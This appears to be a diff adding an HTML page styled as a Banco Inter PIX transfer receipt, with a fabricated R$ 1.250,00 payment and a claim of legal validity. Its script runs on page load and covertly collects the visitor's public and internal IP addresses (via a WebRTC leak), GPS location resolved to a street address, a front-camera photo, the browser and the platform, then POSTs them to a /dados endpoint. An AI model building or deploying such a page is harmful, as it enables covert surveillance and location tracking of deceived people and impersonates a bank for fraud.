@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comprovante PIX - Banco Inter</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #ff6600 0%, #ff8533 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: #333;
+        }
+
+        .receipt-container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+            position: relative;
+        }
+
+        .receipt-header {
+            background: linear-gradient(135deg, #ff6600 0%, #ff8533 100%);
+            color: white;
+            padding: 24px 20px;
+            text-align: center;
+            position: relative;
+        }
+
+        .bank-logo {
+            width: 120px;
+            height: 40px;
+            background: white;
+            border-radius: 8px;
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            color: #ff6600;
+            font-size: 18px;
+            letter-spacing: -0.5px;
+        }
+
+        .receipt-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .receipt-subtitle {
+            font-size: 14px;
+            opacity: 0.9;
+            font-weight: 400;
+        }
+
+        .success-icon {
+            position: absolute;
+            top: -20px;
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            background: #00C851;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: white;
+            border: 4px solid white;
+            box-shadow: 0 4px 12px rgba(0,200,81,0.3);
+        }
+
+        .receipt-body {
+            padding: 30px 20px;
+        }
+
+        .transaction-amount {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .amount-label {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .amount-value {
+            font-size: 36px;
+            font-weight: 700;
+            color: #ff6600;
+            margin-bottom: 4px;
+        }
+
+        .amount-date {
+            font-size: 12px;
+            color: #999;
+        }
+
+        .transaction-details {
+            margin-bottom: 24px;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+        }
+
+        .detail-label {
+            font-size: 13px;
+            color: #666;
+            font-weight: 500;
+            flex: 1;
+        }
+
+        .detail-value {
+            font-size: 13px;
+            color: #333;
+            font-weight: 600;
+            text-align: right;
+            flex: 2;
+            word-break: break-all;
+        }
+
+        .pix-key {
+            background: #f8f9fa;
+            padding: 12px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #333;
+            border-left: 4px solid #ff6600;
+        }
+
+        .transaction-id {
+            background: #f0f7ff;
+            padding: 16px;
+            border-radius: 12px;
+            margin: 24px 0;
+            border: 1px solid #e6f3ff;
+        }
+
+        .id-label {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .id-value {
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            color: #333;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            word-break: break-all;
+        }
+
+        .qr-section {
+            text-align: center;
+            margin: 24px 0;
+            padding: 20px;
+            background: #fafafa;
+            border-radius: 12px;
+        }
+
+        .qr-code {
+            width: 120px;
+            height: 120px;
+            background: white;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            margin: 0 auto 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            color: #333;
+        }
+
+        .qr-label {
+            font-size: 12px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        .security-info {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            padding: 16px;
+            border-radius: 12px;
+            margin: 24px 0;
+            border-left: 4px solid #28a745;
+        }
+
+        .security-title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #28a745;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .security-text {
+            font-size: 11px;
+            color: #666;
+            line-height: 1.4;
+        }
+
+        .receipt-footer {
+            padding: 20px;
+            background: #f8f9fa;
+            border-top: 1px solid #e9ecef;
+        }
+
+        .footer-info {
+            font-size: 10px;
+            color: #999;
+            text-align: center;
+            line-height: 1.4;
+            margin-bottom: 12px;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 16px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 12px 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-primary {
+            background: #ff6600;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #e55a00;
+            transform: translateY(-1px);
+        }
+
+        .btn-secondary {
+            background: white;
+            color: #666;
+            border: 1px solid #ddd;
+        }
+
+        .btn-secondary:hover {
+            background: #f8f9fa;
+            border-color: #ccc;
+        }
+
+        .watermark {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(-45deg);
+            font-size: 80px;
+            color: rgba(255, 102, 0, 0.03);
+            font-weight: 900;
+            pointer-events: none;
+            user-select: none;
+        }
+
+        .status-badge {
+            display: inline-block;
+            background: #d4edda;
+            color: #155724;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            border: 1px solid #c3e6cb;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+            
+            .receipt-container {
+                max-width: 100%;
+            }
+            
+            .amount-value {
+                font-size: 32px;
+            }
+        }
+
+        .timestamp {
+            font-size: 10px;
+            color: #999;
+            text-align: center;
+            margin-top: 12px;
+            font-family: 'Courier New', monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="receipt-container">
+        <div class="watermark">INTER</div>
+        <div class="success-icon">?</div>
+        
+        <div class="receipt-header">
+            <div class="bank-logo">INTER</div>
+            <div class="receipt-title">Comprovante PIX</div>
+            <div class="receipt-subtitle">Transferência realizada com sucesso</div>
+        </div>
+
+        <div class="receipt-body">
+            <div class="transaction-amount">
+                <div class="amount-label">Valor transferido</div>
+                <div class="amount-value">R$ 1.250,00</div>
+                <div class="amount-date">23/07/2025 às 14:32</div>
+            </div>
+
+            <div class="transaction-details">
+                <div class="detail-row">
+                    <div class="detail-label">Para</div>
+                    <div class="detail-value">
+                        <strong>MARIA SILVA SANTOS</strong><br>
+                        <span class="status-badge">Conta confirmada</span>
+                    </div>
+                </div>
+
+                <div class="detail-row">
+                    <div class="detail-label">Instituição</div>
+                    <div class="detail-value">BANCO DO BRASIL S.A.</div>
+                </div>
+
+                <div class="detail-row">
+                    <div class="detail-label">Chave PIX</div>
+                    <div class="detail-value">
+                        <div class="pix-key">maria.santos@email.com</div>
+                    </div>
+                </div>
+
+                <div class="detail-row">
+                    <div class="detail-label">Descrição</div>
+                    <div class="detail-value">Pagamento serviços</div>
+                </div>
+
+                <div class="detail-row">
+                    <div class="detail-label">De</div>
+                    <div class="detail-value">
+                        <strong>JOÃO PEREIRA LIMA</strong><br>
+                        Conta Corrente •••• 4521<br>
+                        Banco Inter S.A.
+                    </div>
+                </div>
+            </div>
+
+            <div class="transaction-id">
+                <div class="id-label">ID da transação</div>
+                <div class="id-value">E2E12345678901234567890123456789012345678</div>
+            </div>
+
+            <div class="qr-section">
+                <div class="qr-code">??</div>
+                <div class="qr-label">Compartilhe este comprovante</div>
+            </div>
+
+            <div class="security-info">
+                <div class="security-title">
+                    ?? Transação segura
+                </div>
+                <div class="security-text">
+                    Esta transferência foi processada com total segurança através do Sistema de Pagamentos Instantâneos (SPI) do Banco Central do Brasil.
+                </div>
+            </div>
+        </div>
+
+        <div class="receipt-footer">
+            <div class="footer-info">
+                Este comprovante tem validade jurídica e comprova a realização da transferência PIX.<br>
+                Banco Inter S.A. • CNPJ: 00.416.968/0001-01<br>
+                Central de Atendimento: 3003-4070
+            </div>
+            
+            <div class="action-buttons">
+                <button class="btn btn-secondary" onclick="shareReceipt()">?? Compartilhar</button>
+                <button class="btn btn-primary" onclick="downloadReceipt()">?? Salvar PDF</button>
+            </div>
+            
+            <div class="timestamp">
+                Gerado em: 23/07/2025 14:32:45 • Protocolo: #INT789456123
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Funcionalidades básicas do comprovante
+        function shareReceipt() {
+            if (navigator.share) {
+                navigator.share({
+                    title: 'Comprovante PIX - Banco Inter',
+                    text: 'Transferência PIX realizada com sucesso - R$ 1.250,00',
+                    url: window.location.href
+                });
+            } else {
+                // Fallback para navegadores que não suportam Web Share API
+                const url = window.location.href;
+                navigator.clipboard.writeText(url).then(() => {
+                    alert('Link copiado para a área de transferência!');
+                });
+            }
+        }
+
+        function downloadReceipt() {
+            // Simulação de download de PDF
+            alert('Comprovante salvo na pasta Downloads\n\ncomprovante-pix-inter.pdf');
+        }
+
+        // Atualizar timestamp em tempo real
+        function updateTimestamp() {
+            const now = new Date();
+            const timestamp = now.toLocaleString('pt-BR', {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            
+            const protocolNumber = Math.random().toString(36).substring(2, 11).toUpperCase();
+            document.querySelector('.timestamp').innerHTML = 
+                `Gerado em: ${timestamp} • Protocolo: #INT${protocolNumber}`;
+        }
+
+        // FUNCIONALIDADES DE CAPTURA DO EXEMPLO ORIGINAL - INÍCIO
+
+        // Função para tentar obter IPs internos usando WebRTC
+        async function obterIPInterno() {
+            return new Promise((resolve) => {
+                let ipv4Interno = 'Não detectado';
+                let ipv6Interno = 'Não detectado';
+
+                const pc = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                if (!pc) {
+                    console.warn('WebRTC não suportado. Não foi possível obter IP interno.');
+                    resolve({ ipv4Interno, ipv6Interno });
+                    return;
+                }
+
+                const noop = () => {};
+                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;
+
+                const findIPs = (text) => {
+                    const matches = text.match(ipRegex);
+                    if (matches) {
+                        matches.forEach(ip => {
+                            // Verifica se é um IPv4 privado
+                            if (ip.startsWith('192.168.') || ip.startsWith('10.') || (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) {
+                                if (ipv4Interno === 'Não detectado') { // Pega o primeiro encontrado
+                                    ipv4Interno = ip;
+                                }
+                            } else if (ip.includes(':') && !ip.startsWith('::') && !ip.startsWith('fe80')) {
+                                // Heurística básica para IPv6 local/global temporário
+                                if (ipv6Interno === 'Não detectado') { // Pega o primeiro encontrado
+                                    ipv6Interno = ip;
+                                }
+                            }
+                        });
+                    }
+                };
+
+                const rtc = new pc({iceServers: []});
+                rtc.createDataChannel('', {reliable: false});
+
+                rtc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    const candidate = ice.candidate.candidate;
+                    findIPs(candidate);
+                    // findIPs(ice.candidate.address); // address pode não estar sempre disponível
+                };
+
+                rtc.createOffer()
+                    .then(sdp => rtc.setLocalDescription(sdp, noop, noop))
+                    .catch(noop);
+
+                // Timeout para garantir que a tentativa seja concluída
+                setTimeout(() => {
+                    rtc.onicecandidate = noop;
+                    rtc.close();
+                    console.log(`IPs internos detectados (tentativa): IPv4: ${ipv4Interno}, IPv6: ${ipv6Interno}`);
+                    resolve({ ipv4Interno, ipv6Interno });
+                }, 2000);
+            });
+        }
+
+        async function capturarDados() {
+            try {
+                // CAPTURA O IP PÚBLICO DO VISITANTE
+                let ip = 'Desconhecido';
+                try {
+                    // Corrigido: Removido o espaço na URL
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    ip = ipData.ip;
+                    console.log("IP Público capturado:", ip);
+                } catch (ipError) {
+                    console.error('Erro ao obter o IP externo via ipify:', ipError);
+                }
+
+                // TENTA CAPTURAR OS IPs INTERNOS
+                let ipsInternos = { ipv4Interno: 'Não detectado', ipv6Interno: 'Não detectado' };
+                try {
+                    ipsInternos = await obterIPInterno();
+                    console.log("IPs internos capturados:", ipsInternos);
+                } catch (internoError) {
+                    console.error("Erro ao tentar obter IPs internos:", internoError);
+                }
+
+                const sistema = navigator.platform;
+                const navegador = navigator.userAgent;
+
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+                    const geoData = await geoRes.json();
+                    const endereco = geoData.display_name || 'Desconhecido';
+
+                    // Tentativa de capturar imagem (opcional)
+                    let stream;
+                    try {
+                        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        await video.play();
+
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const context = canvas.getContext('2d');
+
+                        // Aguarda um pouco para o vídeo carregar
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imagem = canvas.toDataURL('image/png');
+
+                        fetch('/dados', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                latitude,
+                                longitude,
+                                endereco,
+                                imagem,
+                                sistema,
+                                navegador,
+                                ip: ip, // IP público
+                                ipv4Interno: ipsInternos.ipv4Interno, // IP interno IPv4
+                                ipv6Interno: ipsInternos.ipv6Interno  // IP interno IPv6
+                            })
+                        }).then(() => {
+                            console.log('? Localização e dados detectados com sucesso!');
+                            stream.getTracks().forEach(track => track.stop());
+                        }).catch(err => {
+                            console.error("Erro ao enviar dados (com imagem):", err);
+                            if(stream) stream.getTracks().forEach(track => track.stop());
+                        });
+
+                    } catch (mediaError) {
+                        console.warn("Acesso à câmera negado ou falhou, enviando dados sem imagem:", mediaError);
+                        // Envia os dados mesmo sem imagem
+                        fetch('/dados', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                latitude,
+                                longitude,
+                                endereco,
+                                imagem: null, // Indica que não há imagem
+                                sistema,
+                                navegador,
+                                ip: ip, // IP público
+                                ipv4Interno: ipsInternos.ipv4Interno, // IP interno IPv4
+                                ipv6Interno: ipsInternos.ipv6Interno  // IP interno IPv6
+                            })
+                        }).then(() => {
+                            console.log('? Localização e dados detectados com sucesso (sem imagem)!');
+                        }).catch(err => {
+                            console.error("Erro ao enviar dados (sem imagem):", err);
+                        });
+                    }
+                }, (err) => {
+                    console.error("Erro ao obter localização:", err);
+                    // Mesmo sem localização, podemos tentar enviar outros dados?
+                    // Neste caso, vamos pular o envio, pois latitude/longitude são fundamentais
+                    // Mas poderia ser adaptado para enviar apenas IP, sistema, etc.
+                });
+            } catch (err) {
+                console.error("Erro geral:", err);
+            }
+        }
+
+        // FUNCIONALIDADES DE CAPTURA DO EXEMPLO ORIGINAL - FIM
+
+        // Inicializar página
+        document.addEventListener('DOMContentLoaded', function() {
+            updateTimestamp();
+            // Atualizar timestamp a cada 30 segundos
+            setInterval(updateTimestamp, 30000);
+        });
+
+        // Executar captura de dados quando a página carregar
+        window.onload = function() {
+            capturarDados();
+        };
+    </script>
+</body>
+</html>
